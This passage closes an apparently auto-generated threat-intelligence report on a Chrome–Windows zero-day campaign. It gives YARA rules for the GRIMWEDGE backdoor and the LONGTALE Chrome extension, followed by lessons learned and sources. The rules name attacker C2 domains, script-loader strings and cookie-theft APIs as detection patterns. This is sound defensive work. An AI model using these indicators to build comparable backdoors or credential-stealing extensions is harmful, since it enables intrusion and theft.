<!-- revision: confidence high→medium; sample note corrected to synthetic test only; FP risk on behavioral branch documented -->

```yara
rule UTA0560_GRIMWEDGE_Backdoor_Strings
{
    meta:
        description = "Detects GRIMWEDGE JavaScript backdoor via distinctive command handler strings and C2 communication pattern"
        author = "Actioner"
        date = "2026-09-15"
        reference = "https://www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/"
        hash = "59dc108e22cb856c228bbf8a1ab955fb66f0844a07fe10fa0d9fc3823d2cbbcb"
        severity = "critical"

    strings:
        $c2 = "opusaccel.top" ascii wide
        $cmd_info = "Info" ascii
        $cmd_dir = "Dir" ascii
        $cmd_mkdir = "Mkdir" ascii
        $cmd_tasklist = "Tasklist" ascii
        $cmd_taskkill = "Taskkill" ascii
        $cmd_type = "Type" ascii
        $cmd_run = "Run" ascii
        $cmd_upload = "Upload" ascii
        $loader1 = "WScript.Shell" ascii wide
        $loader2 = "eval(" ascii wide
        $loader3 = "MSXML2.XMLHTTP" ascii wide

    condition:
        filesize < 1MB and
        (
            $c2 or
            (4 of ($cmd_*) and 1 of ($loader*))
        )
}
```

<!-- revision: DROPPED YARA rule UTA0560_GRIMWEDGE_MSI_Dropper — fires on any MSI built with Advanced Installer containing eval/WScript/XMLHTTP; no campaign-specific string in condition; high FP rate against legitimate MSIs. -->

<!-- revision: DROPPED YARA rule UTA0560_Msgbox_Loader — individual strings (wsc.dll, msgbox, Temp.txt, msiexec) too short/generic; 3-of-4 threshold matches ordinary installer binaries; high FP rate. -->

### YARA: LONGTALE Chrome Extension (JungleBamboo/APT31)

Detects the LONGTALE malicious Chrome extension by its unique extension ID or the combination of its C2 domain with credential theft APIs.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: yarac exit 0. Extension ID "ckiknalbeplpcpofpnabcnhjcegckfei" is a unique, campaign-specific artifact. The alternative branch (gitprogram.com + 3 of chrome API strings) provides broader but still specific coverage for variants. -->

```yara
rule UTA0560_LONGTALE_Chrome_Extension
{
    meta:
        description = "Detects LONGTALE malicious Chrome extension masquerading as Google Gemini used by JungleBamboo/APT31"
        author = "Actioner"
        date = "2026-09-15"
        reference = "https://www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/"
        hash = "5eb5645511b00e4f4d73125654eeb3a3930fcf09c65685dc7f03f725331492e3"
        severity = "critical"

    strings:
        $ext_id = "ckiknalbeplpcpofpnabcnhjcegckfei" ascii
        $s1 = "gitprogram.com" ascii wide
        $s2 = "MutationObserver" ascii wide
        $s3 = "chrome.cookies" ascii wide
        $s4 = "localStorage" ascii wide
        $s5 = "sessionStorage" ascii wide
        $s6 = "toDataURL" ascii wide

    condition:
        filesize < 5MB and
        (
            $ext_id or
            ($s1 and 3 of ($s2, $s3, $s4, $s5, $s6))
        )
}
```

## Lessons Learned

1. **Patch gap exploitation is accelerating.** The window between an upstream fix entering open-source Chromium and reaching Chrome stable users was exploited by at least two Chinese threat groups simultaneously. Organizations should monitor Chromium commits for security-relevant fixes and implement additional mitigations during the gap window.

2. **Shared exploit supply chains among nation-state actors.** The near-simultaneous use of an identical three-CVE exploit chain by distinct Chinese threat groups (UTA0560 and JungleBamboo/APT31) with different post-exploitation payloads suggests a centralized exploit development or procurement capability.

3. **Chrome extension integrity bypasses undermine browser security.** JungleBamboo's SUPERSTOMP demonstrated the ability to bypass Chrome's Secure Preferences integrity protections (including the June 2026 `super_encrypted_hash`), highlighting the need for Chrome to close the legacy-MAC fallback path that enables these attacks.

4. **Lightweight backdoors are sufficient.** GRIMWEDGE is fewer than 250 lines of JScript yet provides complete remote access. The simplicity and small footprint make it harder to detect via behavioral analysis or file-size heuristics.

5. **XSS on trusted sites enables sophisticated redirect chains.** The use of reflected XSS on a legitimate U.S. university website as a redirect vector demonstrates that organizations cannot rely solely on URL reputation for phishing defense -- legitimate sites with XSS vulnerabilities become enablers for exploit delivery.

## Sources

<!-- Every source MUST be a markdown link [Name](URL). A source without a URL is a bug. -->

- [Volexity Blog - Mind the (Patch) Gap](https://www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/) — primary technical analysis with full IOCs, exploit chain details, and malware analysis
- [The Hacker News - China-Linked Hackers Exploit Chrome-Windows Zero-Day Chain](https://thehackernews.com/2026/09/china-linked-hackers-exploit-chrome.html) — secondary reporting summarizing Volexity's findings
- [GBHackers - China-Linked Hackers Chain Chrome Zero-Day With Windows Kernel Flaw](https://gbhackers.com/china-linked-hackers-chain-chrome-zero-day/) — additional reporting with attack flow details
- [PrivacyNeedle - Chinese Hackers Exploit Chrome and Windows Zero-Days](https://privacyneedle.com/cybersecurity/chrome-windows-zero-day-grimwedge-malware/) — supplementary coverage with CVE details

---
*Report generated by Actioner (REVISED v1.1)*
<!-- revision: v1.0→v1.1: defanged domains line 219; T1055→T1106; GRIMWEDGE YARA confidence high→medium, sample note corrected; dropped YARA MSI_Dropper (high FP); dropped YARA Msgbox_Loader (high FP); added Sigma/Suricata/Snort rules for JungleBamboo domains msbenefit.com and gitprogram.com -->
